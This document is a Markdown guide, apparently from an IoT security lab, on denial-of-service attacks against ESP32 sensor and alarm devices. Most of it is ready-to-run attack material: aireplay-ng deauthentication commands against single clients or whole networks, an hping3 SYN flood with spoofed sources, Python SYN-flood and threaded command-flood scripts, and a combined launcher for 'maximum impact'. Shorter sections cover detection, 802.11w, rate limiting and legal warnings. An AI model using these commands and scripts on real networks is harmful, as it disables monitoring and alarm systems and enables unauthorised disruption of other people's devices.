# Denial of Service Attack Guide

## 🎯 Overview

This guide demonstrates how to disrupt communication between ESP32 IoT devices using wireless deauthentication attacks, effectively creating a Denial of Service (DoS) condition.

---

## 🚫 What is a DoS Attack?

**Denial of Service** attacks prevent legitimate users from accessing a system or service.

**In IoT context:**
- Sensor cannot send readings
- Buzzer cannot receive commands
- System appears "normal" but is non-functional
- Security monitoring disabled

---

## 🛠️ Attack Methods

### Method 1: Wi-Fi Deauthentication (Recommended)

Forces devices to disconnect from Wi-Fi network.

---

### Method 2: TCP SYN Flood

Overwhelms device with connection requests.

---

### Method 3: Command Flooding

Sends rapid command stream to exhaust resources.

---

## 📡 Method 1: Wi-Fi Deauthentication Attack

### Concept

802.11 management frames are **unencrypted** and **unauthenticated** in most networks. This allows attackers to forge deauthentication frames.

**Attack Flow:**
```
1. Attacker sends fake deauth frames
2. Devices believe they're being told to disconnect
3. Devices disconnect from AP
4. Communication stops
5. System fails silently
```

---

### Prerequisites

- Kali Linux or similar
- Wireless adapter with monitor mode
- aircrack-ng suite installed

---

### Step-by-Step Execution

#### Step 1: Enable Monitor Mode

```bash
# Check interface
iwconfig

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates wlan0mon interface
```

**Verify:**
```bash
iwconfig wlan0mon
# Should show Mode:Monitor
```

---

#### Step 2: Identify Target Network

```bash
# Scan for networks
sudo airodump-ng wlan0mon
```

**Expected Output:**
```
CH 11 ][ Elapsed: 12 s ][ 2024-12-07 15:30

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 
 AA:BB:CC:DD:EE:FF  -45       23      156    3   11  270   WPA2 CCMP   PSK  MyNetwork

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 
 AA:BB:CC:DD:EE:FF  11:22:33:44:55:01  -52   54e-54e    0       34              
 AA:BB:CC:DD:EE:FF  11:22:33:44:55:02  -48   54e-54e    0       28
```

**Record:**
- **BSSID (AP MAC):** AA:BB:CC:DD:EE:FF
- **Channel:** 11
- **Sensor MAC:** 11:22:33:44:55:01
- **Buzzer MAC:** 11:22:33:44:55:02

---

#### Step 3: Target Specific Device (Sensor)

```bash
# Deauth the sensor only
sudo aireplay-ng --deauth 0 \
  -a AA:BB:CC:DD:EE:FF \
  -c 11:22:33:44:55:01 \
  wlan0mon
```

**Parameters:**
- `--deauth 0`: Continuous deauth (0 = infinite)
- `-a`: Access Point BSSID
- `-c`: Client MAC to deauth
- `wlan0mon`: Monitor interface

**Output:**
```
15:30:45  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 11
15:30:45  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:01]
15:30:46  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:01]
15:30:47  Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:01]
```

---

#### Step 4: Monitor Impact

**In another terminal:**
```bash
# Watch for disconnection
watch -n 1 'arp -a | grep 192.168.0.101'
```

**Expected:**
- Entry disappears = device disconnected
- No readings received by buzzer
- System appears offline

---

#### Step 5: Target All Devices

```bash
# Deauth entire network (broadcast)
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  wlan0mon
```

**Impact:**
- ALL devices disconnect
- Complete network disruption
- Sensor AND buzzer offline

---

#### Step 6: Stop Attack

```bash
# Press Ctrl+C in aireplay-ng terminal

# Restore normal mode
sudo airmon-ng stop wlan0mon
```

---

### Attack Variations

**Targeted DoS (Single Device):**
```bash
# Only sensor
aireplay-ng --deauth 0 -a [AP_MAC] -c [SENSOR_MAC] wlan0mon
```

**Burst Attack (Limited Duration):**
```bash
# 100 deauth frames only
aireplay-ng --deauth 100 -a [AP_MAC] -c [SENSOR_MAC] wlan0mon
```

**Reason Code Variations:**
```bash
# Code 1: Unspecified reason
aireplay-ng --deauth 0 -a [AP_MAC] -c [SENSOR_MAC] --reason 1 wlan0mon

# Code 7: Class 3 frame received from non-associated station
aireplay-ng --deauth 0 -a [AP_MAC] -c [SENSOR_MAC] --reason 7 wlan0mon
```

---

## 🌊 Method 2: TCP SYN Flood

### Concept

Overwhelm device with TCP connection requests.

### Using hping3

```bash
# Install hping3
sudo apt-get install hping3

# SYN flood attack
sudo hping3 -S -p 80 --flood --rand-source 192.168.0.103
```

**Parameters:**
- `-S`: SYN flag
- `-p 80`: Target port
- `--flood`: Send as fast as possible
- `--rand-source`: Random source IPs

**Impact:**
- Device CPU exhausted
- Cannot process legitimate commands
- May crash or reboot

---

### Using Python

```python
#!/usr/bin/env python3
"""
TCP SYN Flood Attack
"""

from scapy.all import *
import random

target_ip = "192.168.0.103"
target_port = 80

print("[*] Starting SYN flood...")

while True:
    # Random source IP
    src_ip = ".".join(map(str, (random.randint(1,254) for _ in range(4))))
    
    # Craft SYN packet
    ip = IP(src=src_ip, dst=target_ip)
    tcp = TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
    
    # Send
    send(ip/tcp, verbose=0)
```

---

## 📨 Method 3: Command Flooding

### Concept

Send commands faster than device can process.

### Rapid Command Script

```python
#!/usr/bin/env python3
"""
Command Flood Attack
Sends commands at maximum rate
"""

import socket
import threading
import time

TARGET_IP = "192.168.0.103"
TARGET_PORT = 80
NUM_THREADS = 10

def flood_commands():
    """Send commands continuously"""
    commands = ["ALARM", "CLEAR", "TEMP:99", "STATUS"]
    
    while True:
        for cmd in commands:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((TARGET_IP, TARGET_PORT))
                s.sendall((cmd + "\n").encode())
                s.close()
            except:
                pass

print(f"[*] Starting command flood with {NUM_THREADS} threads...")

# Launch multiple threads
threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=flood_commands)
    t.daemon = True
    t.start()
    threads.append(t)

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[*] Stopped")
```

**Impact:**
- Device buffer overflow
- Legitimate commands lost
- CPU exhaustion
- Potential crash

---

## 🎯 Combined Attack

### Maximum Impact Strategy

```bash
#!/bin/bash
# combined_dos.sh

echo "[*] Launching combined DoS attack..."

# Terminal 1: Deauth attack
gnome-terminal -- bash -c "sudo aireplay-ng --deauth 0 -a [AP_MAC] -c [SENSOR_MAC] wlan0mon; exec bash"

# Terminal 2: SYN flood
gnome-terminal -- bash -c "sudo hping3 -S -p 80 --flood 192.168.0.103; exec bash"

# Terminal 3: Command flood
gnome-terminal -- bash -c "python3 command_flood.py; exec bash"

echo "[!] All attacks launched"
echo "[!] Press Ctrl+C to stop all"
```

---

## 📊 Attack Effectiveness

### Deauthentication Attack

| Metric | Value |
|--------|-------|
| Effectiveness | 100% |
| Detection Risk | Medium |
| Persistence | Continuous |
| Countermeasure | 802.11w |

### SYN Flood

| Metric | Value |
|--------|-------|
| Effectiveness | 80% |
| Detection Risk | High |
| Persistence | Requires active sending |
| Countermeasure | SYN cookies |

### Command Flood

| Metric | Value |
|--------|-------|
| Effectiveness | 60% |
| Detection Risk | High |
| Persistence | Requires active sending |
| Countermeasure | Rate limiting |

---

## 🛡️ Detection Methods

### Network Level

```bash
# Detect deauth frames
sudo airodump-ng wlan0mon --write detect

# Look for excessive deauth in Wireshark
tshark -r detect-01.cap -Y "wlan.fc.type_subtype == 0x0c"
```

### Device Level

```python
#!/usr/bin/env python3
"""
Connection Monitor
Detects disconnection attacks
"""

import subprocess
import time

target_ip = "192.168.0.101"
check_interval = 1  # seconds

disconnection_count = 0
alert_threshold = 3

print("[*] Monitoring device connectivity...")

while True:
    # Ping device
    result = subprocess.call(['ping', '-c', '1', '-W', '1', target_ip],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
    
    if result != 0:
        disconnection_count += 1
        print(f"[!] Device offline (count: {disconnection_count})")
        
        if disconnection_count >= alert_threshold:
            print("[!!!] ATTACK DETECTED - Multiple disconnections")
    else:
        disconnection_count = 0
    
    time.sleep(check_interval)
```

---

## 🔒 Defense Mechanisms

### 1. Enable 802.11w (PMF - Protected Management Frames)

**On Router:**
```
Advanced Settings → Wireless → Security
☑ Enable Protected Management Frames (PMF)
```

**Effect:** Deauth attacks no longer work

---

### 2. Implement SYN Cookies

**On Linux (ESP32 would need custom implementation):**
```bash
# Enable SYN cookies
sysctl -w net.ipv4.tcp_syncookies=1
```

---

### 3. Rate Limiting

```arduino
// ESP32 code
unsigned long lastCommandTime = 0;
const int MIN_INTERVAL = 1000; // 1 second

void handleCommand(String cmd) {
    unsigned long now = millis();
    
    if (now - lastCommandTime < MIN_INTERVAL) {
        Serial.println("Rate limit exceeded");
        return;
    }
    
    lastCommandTime = now;
    // Process command
}
```

---

### 4. Connection Monitoring

```arduino
// ESP32 code - Auto-reconnect
void loop() {
    if (WiFi.status() != WL_CONNECTED) {
        Serial.println("Disconnected - Reconnecting...");
        WiFi.begin(ssid, password);
        
        int attempts = 0;
        while (WiFi.status() != WL_CONNECTED && attempts < 10) {
            delay(500);
            attempts++;
        }
    }
    
    // Normal operations
}
```

---

### 5. Watchdog Timer

```arduino
// ESP32 code - Auto-reset on hang
#include <esp_task_wdt.h>

void setup() {
    // Enable watchdog (10 seconds)
    esp_task_wdt_init(10, true);
    esp_task_wdt_add(NULL);
}

void loop() {
    // Reset watchdog
    esp_task_wdt_reset();
    
    // Your code here
}
```

---

## 📈 Impact Timeline

### Short-term (Minutes)

- Sensor disconnects
- No readings transmitted
- Alarm system offline
- User unaware

### Medium-term (Hours)

- Missed security events
- No temperature monitoring
- System appears "normal"
- Potential security breaches

### Long-term (Days)

- Trust in system degraded
- Investigation costs
- System replacement
- Reputation damage

---

## ⚠️ Legal Consequences

**DoS attacks are ILLEGAL without authorization:**

- **18 U.S.C. § 1030** (Computer Fraud and Abuse Act)
- **18 U.S.C. § 2511** (Wiretap Act)
- State computer crime laws

**Penalties:**
- Up to 10 years imprisonment (first offense)
- Up to 20 years (repeat offenders)
- Fines up to $250,000
- Civil liability for damages

---

## ✅ Legitimate Uses

**These techniques are acceptable for:**

1. ✅ Testing your own devices
2. ✅ Authorized security assessments
3. ✅ Academic research (controlled lab)
4. ✅ Vendor security testing
5. ✅ Responsible disclosure

**Obtain written authorization before testing!**

---

## 🎓 Key Takeaways

1. **Wireless networks are vulnerable to deauth attacks**
2. **802.11w (PMF) provides protection**
3. **IoT devices need resilience mechanisms**
4. **Rate limiting prevents flooding**
5. **Monitoring detects attacks**
6. **DoS attacks are serious crimes**

---

## 🔧 Cleanup

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restore normal network
sudo systemctl restart NetworkManager

# Verify connectivity
ping -c 3 google.com
```

---

**Related Guides:**
- [MITM Setup](mitm-setup.md)
- [Command Injection](command-injection.md)
- [Protocol Analysis](protocol-analysis.md)

---

*Always use these techniques responsibly and legally.* 🔐